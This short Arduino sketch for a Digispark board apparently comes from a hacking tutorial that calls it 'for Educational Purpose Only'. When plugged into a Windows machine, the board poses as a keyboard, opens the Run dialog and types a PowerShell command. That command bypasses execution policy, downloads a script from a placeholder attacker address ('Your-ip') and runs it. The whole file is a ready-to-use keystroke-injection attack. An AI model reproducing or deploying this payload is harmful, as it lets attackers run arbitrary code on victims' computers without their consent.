/*=================================================================================
 The code is developed for Educational Purpose Only , learn and hack yourself 
                       By -- HACK WITH ROHIT TAMIL
====================================================================================*/

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2300);
  DigiKeyboard.print(F("powershell -NoP -ep Bypass \" irm -Uri http://Your-ip/file | iex\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ }
}
